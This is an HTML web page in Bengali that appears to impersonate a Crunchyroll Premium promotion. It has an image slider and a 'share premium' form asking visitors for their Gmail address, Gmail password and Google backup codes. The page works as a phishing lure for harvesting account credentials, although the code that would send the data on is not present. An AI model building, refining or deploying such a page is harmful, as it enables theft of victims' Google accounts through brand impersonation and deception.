<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Crunchyroll Premium Offers</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background: linear-gradient(135deg, #FF6F00, #FF3D00, #E65100); /* Crunchyroll-inspired gradient */
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            color: #fff;
            box-sizing: border-box;
            overflow-x: hidden; /* Prevent horizontal scroll */
        }

        .header-title {
            font-size: 3em;
            font-weight: 900;
            text-align: center;
            margin-bottom: 30px;
            color: #fff;
            text-shadow: 2px 2px 8px rgba(0, 0, 0, 0.4);
            letter-spacing: 1.5px;
            animation: fadeInDown 1s ease-out;
        }

        @keyframes fadeInDown {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* --- Image Slider --- */
        .slider-container {
            width: 100%;
            max-width: 800px; /* Wider slider for banners */
            height: 300px; /* Fixed height for consistency */
            overflow: hidden;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            margin-bottom: 40px;
            position: relative;
        }

        .slider {
            display: flex;
            width: 300%; /* For 3 images */
            height: 100%;
            transition: transform 1s cubic-bezier(0.68, -0.55, 0.27, 1.55); /* Smooth, bouncy transition */
        }

        .slider img {
            width: calc(100% / 3); /* Each image takes 1/3 of the slider width */
            height: 100%;
            object-fit: cover; /* Cover the area, crop if necessary */
            display: block;
            border-radius: 15px; /* Match container border-radius */
        }

        /* --- Offer Options --- */
        .options-container {
            width: 100%;
            max-width: 600px;
            background: rgba(255, 255, 255, 0.15); /* Semi-transparent white */
            backdrop-filter: blur(8px); /* Glassmorphism effect */
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            padding: 30px;
            display: flex;
            flex-direction: column;
            gap: 20px;
            align-items: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            animation: fadeInUp 1s ease-out forwards;
            animation-delay: 0.5s;
            opacity: 0;
        }

        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .option-buttons {
            display: flex;
            width: 100%;
            gap: 15px;
            margin-bottom: 25px;
        }

        .option-btn {
            flex: 1;
            padding: 15px 20px;
            background-color: rgba(255, 255, 255, 0.2); /* Subtle button background */
            border: 2px solid transparent;
            border-radius: 10px;
            color: #fff;
            font-size: 1.2em;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
        }

        .option-btn:hover {
            background-color: rgba(255, 255, 255, 0.3);
            transform: translateY(-3px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .option-btn.active {
            background-color: #FF6F00; /* Crunchyroll orange for active */
            border-color: #fff;
            box-shadow: 0 0 20px rgba(255, 111, 0, 0.6);
            transform: translateY(-5px);
        }

        /* --- Share Form (Hidden by default) --- */
        .share-form {
            width: 100%;
            display: none; /* Hidden by default */
            flex-direction: column;
            gap: 15px;
            padding-top: 15px;
            border-top: 1px solid rgba(255, 255, 255, 0.2);
            animation: fadeIn 0.5s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .share-form.active {
            display: flex; /* Show when active */
        }

        .form-input-group {
            position: relative;
            margin-bottom: 15px;
        }

        .form-input {
            width: calc(100% - 30px); /* Adjust for padding */
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            border-radius: 8px;
            color: #fff;
            font-size: 1em;
            outline: none;
            transition: all 0.3s ease;
        }

        .form-input::placeholder {
            color: rgba(255, 255, 255, 0.7);
        }

        .form-input:focus {
            background: rgba(255, 255, 255, 0.2);
            border-color: #FF6F00; /* Crunchyroll orange focus */
            box-shadow: 0 0 10px rgba(255, 111, 0, 0.4);
        }

        .submit-btn {
            padding: 15px 25px;
            background-color: #FF6F00; /* Crunchyroll orange */
            border: none;
            border-radius: 10px;
            color: #fff;
            font-size: 1.2em;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }

        .submit-btn:hover {
            background-color: #E65100;
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
        }

        /* Responsive Adjustments */
        @media (max-width: 768px) {
            .header-title {
                font-size: 2.2em;
            }
            .slider-container {
                height: 250px;
            }
            .options-container {
                padding: 20px;
            }
            .option-buttons {
                flex-direction: column;
            }
            .option-btn {
                font-size: 1em;
                padding: 12px 15px;
            }
            .form-input {
                font-size: 0.9em;
                padding: 12px;
            }
            .submit-btn {
                font-size: 1em;
                padding: 12px 20px;
            }
        }

        @media (max-width: 480px) {
            .header-title {
                font-size: 1.8em;
                margin-bottom: 20px;
            }
            .slider-container {
                height: 200px;
                margin-bottom: 30px;
            }
            .options-container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <h1 class="header-title">Crunchyroll Premium অফার</h1>

    <div class="slider-container">
        <div class="slider" id="imageSlider">
            <img src="cranchyrooll shear.jpg" alt="Crunchyroll Offer 1">
            <img src="cranchyrooll private.jpg" alt="Crunchyroll Offer 2">
            <img src="https://via.placeholder.com/800x300/FF3D00/FFFFFF?text=Exclusive+Content+3" alt="Crunchyroll Offer 3">
        </div>
    </div>

    <div class="options-container">
        <div class="option-buttons">
            <button type="button" class="option-btn active" id="shareBtn" onclick="toggleOption('share')">শেয়ার প্রিমিয়াম</button>
            <button type="button" class="option-btn" id="privateBtn" onclick="toggleOption('private')">একাকী প্রিমিয়াম</button>
        </div>

        <form class="share-form active" id="shareForm">
            <div class="form-input-group">
                <input type="email" class="form-input" placeholder="আপনার Gmail" required>
            </div>
            <div class="form-input-group">
                <input type="password" class="form-input" placeholder="আপনার পাসওয়ার্ড" required>
            </div>
            <div class="form-input-group">
                <input type="text" class="form-input" placeholder="ব্যাকআপ কোড (যদি থাকে)" optional>
            </div>
            <button type="submit" class="submit-btn">সাবমিট করুন</button>
        </form>

        <div class="private-content" id="privateContent" style="display: none; text-align: center; color: rgba(255, 255, 255, 0.8);">
            <p>আপনি ব্যক্তিগত প্রিমিয়াম বেছে নিয়েছেন। আপনার অ্যাকাউন্টে কোনো পরিবর্তন হবে না।</p>
            <p style="font-size: 0.9em; margin-top: 15px;">আরও তথ্যের জন্য আমাদের সাপোর্ট টিমের সাথে যোগাযোগ করুন।</p>
        </div>
    </div>

    <script>
        // Image Slider Logic
        const slider = document.getElementById('imageSlider');
        let currentSlide = 0;
        const totalSlides = slider.children.length;

        function nextSlide() {
            currentSlide = (currentSlide + 1) % totalSlides;
            slider.style.transform = `translateX(-${currentSlide * 100 / totalSlides}%)`;
        }
        setInterval(nextSlide, 5000); // Change slide every 5 seconds

        // Option Toggling Logic
        const shareBtn = document.getElementById('shareBtn');
        const privateBtn = document.getElementById('privateBtn');
        const shareForm = document.getElementById('shareForm');
        const privateContent = document.getElementById('privateContent');

        function toggleOption(option) {
            if (option === 'share') {
                shareBtn.classList.add('active');
                privateBtn.classList.remove('active');
                shareForm.classList.add('active');
                shareForm.style.display = 'flex'; // Ensure flex display when active
                privateContent.style.display = 'none';
            } else { // option === 'private'
                privateBtn.classList.add('active');
                shareBtn.classList.remove('active');
                privateContent.style.display = 'block'; // Ensure block display when active
                shareForm.classList.remove('active');
                shareForm.style.display = 'none'; // Hide share form
            }
        }

        // Initialize with Share option active
        document.addEventListener('DOMContentLoaded', () => {
            toggleOption('share');
        });
    </script>
</body>
  </html>
